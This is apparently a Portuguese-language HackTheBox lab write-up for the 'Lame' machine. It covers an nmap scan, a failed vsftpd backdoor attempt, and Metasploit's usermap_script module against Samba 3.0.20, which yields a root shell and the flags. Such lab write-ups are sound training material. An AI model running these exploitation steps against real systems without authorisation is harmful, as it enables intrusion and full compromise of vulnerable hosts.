# Lame

## Informações da Máquina

| Atributo | Valor |
|----------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Easy |
| **OS** | Linux |
| **IP** | 10.10.10.3 |
| **Técnicas** | Samba 3.0.20 Exploitation, usermap_script RCE |
| **Link HTB** | [https://app.hackthebox.com/machines/Lame](https://app.hackthebox.com/machines/Lame) |

## Resumo

Máquina Linux clássica que requer apenas um exploit para obter acesso root direto. Explora vulnerabilidade conhecida em Samba 3.0.20 através do módulo `usermap_script`.

## Enumeration/Scanning

### Port Scanning

```bash
nmap -sVC -p- -oN nmap.out 10.10.10.3 -Pn
```

**Portas abertas:**
- 21/tcp - FTP (vsftpd 2.3.4)
- 22/tcp - SSH
- 139/tcp - Netbios-SSN (Samba)
- 445/tcp - Samba

## Exploitation

### Tentativa 1: VSFTPd 2.3.4

Testado exploit `exploit/unix/ftp/vsftpd_234_backdoor` (Metasploit).

**Resultado:** Não funcionou.

### Tentativa 2: Samba 3.0.20

**Vulnerabilidade:** Samba v3.0.20 contém vulnerabilidade no `usermap_script` que permite execução remota de comandos.

Utilizando exploit `exploit/multi/samba/usermap_script` (Metasploit):

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
exploit
```

**Shell obtido:** root

## Privilege Escalation

Não necessário - shell já é root.

```bash
whoami
# root

cat /root/root.txt
cat /home/*/user.txt
```

**User Flag:** ✓  
**Root Flag:** ✓

## Lições Aprendidas

- **Samba 3.0.20** possui vulnerabilidade crítica conhecida que permite RCE direto como root
- Máquinas antigas frequentemente têm vulnerabilidades bem documentadas
- Nem sempre é necessário escalar privilégios - alguns exploits já dão acesso root
- Importante testar múltiplos vetores de ataque quando um falha

---

*Writeup by kp*
